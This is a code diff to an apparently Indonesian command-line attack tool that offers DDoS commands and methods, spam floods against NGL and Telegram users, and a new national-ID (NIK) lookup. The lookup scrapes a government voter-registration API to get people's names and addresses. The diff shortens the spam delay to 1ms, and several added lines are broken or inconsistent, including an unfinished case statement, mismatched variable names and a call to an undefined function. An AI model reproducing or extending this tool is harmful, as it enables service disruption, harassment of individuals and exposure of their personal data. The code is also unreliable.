@@ -8,6 +8,52 @@ const { MailerSend, EmailParams, Sender, Recipient } = require("mailersend");
 const TLZZ = `
 ╭─────❒ 「 ${"root@kukis".red} 」
 └──❒ `
+const PENDINGDDOS =  `
+╭─────❒  DDOS STARTING... 
+│ Target  : ${'${target}'.red}
+│ Methods : ${'${method}'.red}
+| Time    : ${'${time}'.red}
+│ Note    : ${'Jangan lupa jeda biar vps ga meledakkkkk'.magenta}
+└──────────❒`
+const PENDINGNGL = `
+╭─────❒  SPAMNGL STARTING... 
+│ Target  : ${'${target}'.red}
+│ Count   : ${'${count}'.red}
+| Time    : ${'${time}'.red}
+│ Note    : ${'Masukan Teks...'.magenta}
+└──────────❒`
+const PENDINGTELE = `
+╭─────❒  SPAMTELE STARTING... 
+│ Target  : ${'${token}'.red}
+│ ID      : ${'${id}'.red}
+│ Count   : ${'${count}'.red}
+| Time    : ${'${time}'.red}
+│ Note    : ${'Masukan Teks...'.magenta}
+└──────────❒`
+const OSINTRESULTS = `
+╭─────❒  OSINT RESULTS
+│ Target   : ${'${target}'.red}
+│ Methods  : ${'${methods}'.red}
+│ Location : ${'${loc}'.red}
+| Link     : ${'${link}'.red}
+│ Note     : ${'Masukan Teks...'.magenta}
+└──────────❒`
+const NIKRESULTS = `
+╭─────❒  NIK RESULTS
+│ NIK                  : ${'${target}'.red}
+│ Name                 : ${`${d.nama}`.red}
+│ Place/Date of birth  : ERR
+| Gender               : ERR
+│ Address              : ${`${d.namaKabupaten}`.yellow} , ${`${d.namaPropinsi}`.yellow}
+│     └──────────❒ RT/RW : ${`RT ${d.rt} / RW ${d.rw}`.yellow}
+│     └──────────❒ Sub-district/Village : ${`${d.namaKelurahan}`.yellow}
+│     └──────────❒ District         : ${`${d.namaKecamatan}`.yellow}
+│ Religion             : ERR
+│ Marital status       : ERR
+│ Work                 : ERR
+│ Citizenship          : ERR
+│ Valid until          : ${`Lifetime`.red}
+└──────────❒`
 
 const rl = readline.createInterface({
     input: process.stdin,
@@ -86,11 +132,11 @@ function mainMenu() {
     console.clear();
     console.log(ASCII);
     console.log(`╭─────❒ 「 MENU UTAMA 」
-│ /ddosmenu  - List Command DDoS
-│ /spammenu  - List Command Spam
-│ /osintmenu - List Command Tracking
-│ /ai [msg]  - Tanya BlackFox AI
-│ /menu      - Balik ke sini
+│ ddosmenu  - List Command DDoS
+│ spammenu  - List Command Spam
+│ osintmenu - List Command Tracking
+│ ai [msg]  - Tanya BlackFox AI
+│ menu      - Balik ke sini
 └──────────❒`.cyan);
     handleCmd();
 }
@@ -101,17 +147,18 @@ function handleCmd() {
         const cmd = args[0];
 
         switch(cmd) {
-            case '/ddosmenu': ddosMenu(); break;
-            case '/spammenu': spamMenu(); break;
-            case '/osintmenu': osintMenu(); break;
-            case '/tempmail': tempMailExec(); break;
-            case '/ai': blackFoxAI(args.slice(1).join(' ')); break;
-            case '/attack': attackExec(args[1], args[2], args[3], args[4], args[5]); break;
-            case '/mc-attack': attackExec(args[1], 'mc-flood', args[3], null, null, args[2]); break;
-            case '/sattack': attackExec(args[1], 'strike', args[2]); break;
-            case '/sngl': spamNGL(args[1], args[2], args[3]); break;
-            case '/tspam': spamTele(args[1], args[2], args[3], args[4]); break;
-            case '/menu': mainMenu(); break;
+            case 'ddosmenu': ddosMenu(); break;
+            case 'spammenu': spamMenu(); break;
+            case 'osintmenu': osintMenu(); break;
+            case 'tempmail': tempMailExec(); break;
+            case 'ai': blackFoxAI(args.slice(1).join(' ')); break;
+            case 'attack': attackExec(args[1], args[2], args[3], args[4], args[5]); break;
+            case 'mc-attack': attackExec(args[1], 'mc-flood', args[3], null, null, args[2]); break;
+            case 'track
+            case 'sattack': attackExec(args[1], 'strike', args[2]); break;
+            case 'sngl': spamNGL(args[1], args[2], args[3]); break;
+            case 'tspam': spamTele(args[1], args[2], args[3], args[4]); break;
+            case 'menu': mainMenu(); break;
             default: if(cmd) console.log("Command Gak Ada, Babi!".red); handleCmd();
         }
     });
@@ -120,9 +167,9 @@ function handleCmd() {
 function ddosMenu() {
     console.clear(); console.log(ASCII);
     console.log(`╭─────❒ 「 DDOS COMMANDS 」
-│ /attack [target] [method] [time] [rate] [thread]
-│ /mc-attack [ip] [port] [time]
-│ /sattack [target] [time]
+│ attack [target] [method] [time] [rate] [thread]
+│ mc-attack [ip] [port] [time]
+│ sattack [target] [time]
 ├─────❒ 「 METHODS 」
 │ bypass, http-x, destroy, flood, mc-flood, strike
 └──────────❒`.red);
@@ -132,8 +179,8 @@ function ddosMenu() {
 function spamMenu() {
     console.clear(); console.log(ASCII);
     console.log(`╭─────❒ 「 SPAM COMMANDS 」
-│ /sngl [username] [pesan] [jumlah] (Delay 100ms)
-│ /tspam [token] [id] [pesan] [jumlah] (Delay 100ms)
+│ sngl [username] [pesan] [jumlah] (Delay 100ms)
+│ tspam [token] [id] [pesan] [jumlah] (Delay 100ms)
 └──────────❒`.yellow);
     handleCmd();
 }
@@ -141,8 +188,9 @@ function spamMenu() {
 function osintMenu() {
     console.clear(); console.log(ASCII);
     console.log(`╭─────❒ 「 OSINT COMMANDS 」
-│ /check [ip] ip
-│ /check [url] getcode
+│ track [target] [methods]
+├─────❒ 「 METHODS 」
+│ ip, nik, email, number
 └──────────❒`.blue);
     handleCmd();
 }
@@ -184,28 +232,60 @@ async function tempMailExec() {
             // Note: API MailerSend butuh inbound route, ini standby mode
         } catch (e) {}
     }, 5000);
+    
+// -- OSINT LACAK KTP -- //
+async function trackNIK(terget) {
+    console.log(`[*] SEDANG TRACKING NIK: ${target}...`.yellow);
+    
+    try {
+        const response = await axios.post('https://cekdptonline.kpu.go.id/api/beranda', {
+            search: nik
+        }, {
+            headers: {
+                'Content-Type': 'application/json',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+            }
+        });
+
+        const res = response.data;
+
+        if (res.status === 'success' && res.data.findceknik) {
+            const d = res.data.findceknik;
+            
+            console.log(NIKRESULTS);
+        } else {
+            console.log(`[!] NIK TIDAK DITEMUKAN ATAU FORMAT SALAH, GOBLOK!`.red);
+        }
+
+    } catch (e) {
+        console.log(`[!] API MATI ATAU KENA BLOCK, TOLOL! Error: ${e.message}`.red);
+    }
+}
+
+// Eksekusi sekarang, anjing!
+trackNIKReal('3201XXXXXXXXXXXXXXXX');    
 
 // --- LOGIC SPAM (DELAY 100ms) ---
 async function spamNGL(target, message, count) {
-    console.log(`\n[!] Memulai Bantai NGL: ${target}`.yellow);
+    console.log(PENDINGNGL);
     for (let i = 0; i < count; i++) {
         try {
             await axios.post('https://ngl.link/api/submit', { username: target, question: message });
             console.log(`[${i+1}] Berhasil kirim pesan ke ${target}`.green);
         } catch (e) { console.log(`[${i+1}] Gagal/Rate Limit`.red); }
-        await new Promise(r => setTimeout(r, 100));
+        await new Promise(r => setTimeout(r, 1));
     }
     handleCmd();
 }
 
 async function spamTele(token, id, message, count) {
-    console.log(`\n[!] Memulai Bantai Telegram: ${id}`.yellow);
+    console.log(PENDINGTELE);
     for (let i = 0; i < count; i++) {
         try {
             await axios.get(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)}`);
             console.log(`[${i+1}] Spam bot terkirim ke ${id}`.green);
         } catch (e) { console.log(`[${i+1}] Gagal, cek token/id!`.red); }
-        await new Promise(r => setTimeout(r, 100));
+        await new Promise(r => setTimeout(r, 1));
     }
     handleCmd();
 }
@@ -225,4 +305,3 @@ async function blackFoxAI(prompt) {
 }
 
 checkAuth();
-}
